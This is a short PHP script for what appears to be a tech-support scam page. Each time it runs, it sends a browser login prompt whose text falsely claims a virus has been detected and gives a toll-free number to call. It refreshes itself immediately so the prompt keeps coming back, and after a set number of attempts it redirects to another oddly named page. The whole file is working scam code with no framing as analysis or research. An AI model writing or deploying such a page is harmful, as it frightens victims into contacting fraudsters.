<?php

    session_start();

    $_user = 'windows2019sd';
    $_password = 'microsoftxds';

    if ($_SERVER['PHP_AUTH_USER'] != $_user || $_SERVER['PHP_AUTH_PW'] != $_password ) {

        if(isset($_SESSION['login_attempts'])){ $_SESSION['login_attempts']++; }else{$_SESSION['login_attempts'] = 13;}

        if($_SESSION['login_attempts'] == 80){
            header('Location: sdscvsdhfhdsfd23233bncxcv.php');
            exit;
        } else {

           header('WWW-Authenticate: Basic realm=" Suspicious activity detected on your IP address due to harmful virus installed in your computer.Call Toll Free Now @ +1-888-207-8658 for any assistance." for access."');
           header('HTTP/1.0 401 Unauthorized');
$page = $_SERVER['PHP_SELF'];
 $sec = "0";
 header("Refresh: $sec; url=$page");
         echo "";


            exit;
        }
    } else {

        header('Location: sdscvsdhfhdsfd23233bncxcv.php');


        exit;
    }
?>
